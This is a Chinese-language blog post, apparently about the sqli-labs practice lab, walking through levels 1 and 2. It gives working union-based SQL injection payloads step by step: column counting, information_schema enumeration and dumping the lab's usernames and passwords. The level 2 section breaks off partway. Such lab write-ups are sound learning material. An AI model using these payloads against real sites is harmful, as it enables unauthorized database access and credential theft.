@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <title>白白毛毛</title>
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/css/_custom.css">
+<meta name="generator" content="Hexo 8.1.1"></head>
+<body class="bg-post">
+
+<div class="sidebar">
+    <div class="header-info">
+        <a href="/"><img src="/images/avatar.jpg" class="avatar"></a>
+        <div class="site-author">白白毛毛</div>
+    </div>
+    <nav class="nav">
+        <a href="/">首页</a>
+        <a href="/categories">分类</a>
+        <a href="/archives">所有</a>
+    </nav>
+    <div class="contact-section">
+        <p>If you want find me:</p>
+        <div class="contact-item"><img src="/images/qq.png"> 729626523</div>
+        <div class="contact-item"><img src="/images/GitHub.png"> yu-star-cyrene</div>
+        <div class="contact-item"><img src="/images/email.jpg"> y19350026593</div>
+    </div>
+</div>
+
+<div class="content-area">
+    
+<div style="height: 60px;"></div>
+<div class="content-wrapper">
+    <article class="post-article">
+        <h1 style="text-align: center; font-size: 2.2em; margin-bottom: 20px;">sql lab 实战</h1>
+        
+        <div style="text-align: center; color: #999; margin-bottom: 40px; border-bottom: 1px solid #eee; padding-bottom: 20px; font-size: 0.9em;">
+            <span>📅 发布: 2025-12-25</span>
+            <span style="margin: 0 15px;">|</span>
+            <span style="color: #007bff; font-weight: bold;">📝 更新: 2025-12-25</span>
+            
+            
+        </div>
+        
+        <div class="article-content">
+            <h1 id="SQL-LAB-实战："><a href="#SQL-LAB-实战：" class="headerlink" title="#SQL LAB 实战："></a>#SQL LAB 实战：</h1><h2 id="1："><a href="#1：" class="headerlink" title="#1："></a>#1：</h2><p><img src="/images/QQ20251225-190908.png" alt="alt text"></p>
+<p>输入直接输入?id&#x3D;1。</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Dumb</span><br><span class="line">Your Password:Dumb</span><br></pre></td></tr></table></figure>
+
+<p>输入?id&#x3D;2.</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Angelina</span><br><span class="line">Your Password:I-kill-you</span><br></pre></td></tr></table></figure>
+
+<p>目测是联合注入。</p>
+<p>开始判断字符还是数字注入。</p>
+<p>输入?id&#x3D;2-1</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Angelina</span><br><span class="line">Your Password:I-kill-you</span><br></pre></td></tr></table></figure>
+
+<p>与?id&#x3D;2一样，说明sql后端并非数字计算类，猜测字符型。</p>
+<p>输入?id&#x3D;1’。</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br></pre></td></tr></table></figure>
+
+<p>报错了，大概率是多加进去的单引号破坏了mysql语句。</p>
+<p>再加一个单引号，?id&#x3D;1’’。</p>
+<p>得到回显是正常没有报错的，目测后端是像这个的。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$sql = &quot;SELECT * FROM users WHERE id = &#x27;$id&#x27;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>进行列表测试，发现?id&#x3D;1’ ORDER BY 3 –+这个是正常的，但?id&#x3D;1’ ORDER BY 4 –+就出问题了，说明一共是三个列表。</p>
+<p>进行显位测试，发现?id&#x3D;-1’ UNION SELECT 1, 2, 3 –+时，网页回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
+
+<p>发现，2是回显在name,3是回显在Password。</p>
+<p>进行爆库。</p>
+<p>注入?id&#x3D;-1’ UNION SELECT 1, database(), 3 –+。</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:security</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
+
+<p>发现当前数据库名字为security。</p>
+<p>进行爆表测试。</p>
+<p>注入?id&#x3D;-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;’security’ –+。</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:emails,referers,uagents,users</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
+
+<p>到这里基本就已经彻底打入数据库，可以随时拿到我们需要的东西了。</p>
+<p>注入?id&#x3D;-1’ UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_schema &#x3D;’security’ AND table_name&#x3D;’users’ –+</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:id,username,password</span><br></pre></td></tr></table></figure>
+
+<p>users列中存放着id 用户名以及密码。</p>
+<p>注入?id&#x3D;-1’ UNION SELECT 1,group_concat(username SEPARATOR ‘-‘),group_concat(password SEPARATOR ‘-‘) FROM users –+</p>
+<p>得到内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:Dumb-Angelina-Dummy-secure-stupid-superman-batman-admin-admin1-admin2-admin3-dhakkan-admin4</span><br><span class="line">Your Password:Dumb-I-kill-you-p@ssword-crappy-stupidity-genious-mob!le-admin-admin1-admin2-admin3-dumbo-admin4</span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<p>过程小总结：</p>
+<p>测试发现并非数字型，且加入单引号报错，推断后端mysql代码，然后进行正常攻击，完完全全的新手关。</p>
+<hr>
+<h2 id="2："><a href="#2：" class="headerlink" title="#2："></a>#2：</h2><p><img src="/images/QQ20251225-194450.png" alt="alt text"></p>
+<p>先正常的测试类型，注入?id&#x3D;1，有回显，猜测是联合与报错。</p>
+<p>注入?id&#x3D;3-1。</p>
+<p>发现回显内容跟注入?id&#x3D;2一样，很像数字型，但又发现注入?id&#x3D;1’，一样报错。</p>
+<p>猜测后端为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&#x27;id&#x27;];</span><br><span class="line">$sql = &quot;SELECT * FROM users WHERE id = $id&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>注入?id&#x3D;-1 UNION SELECT 1, 2, 3。</p>
+<p>得到回显：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:2</span><br><span class="line">Your Password:3</span><br></pre></td></tr></table></figure>
+
+<p>发现回显位。</p>
+<p>进行爆库测试，</p>
+<hr>
+<p>版权声明：本文由白白毛毛创作，转载请注明出处。</p>
+
+        </div>
+    </article>
+</div>
+
+</div>
+
+<script src="/js/main.js?v=1766730381446"></script>
+</body>
+</html>
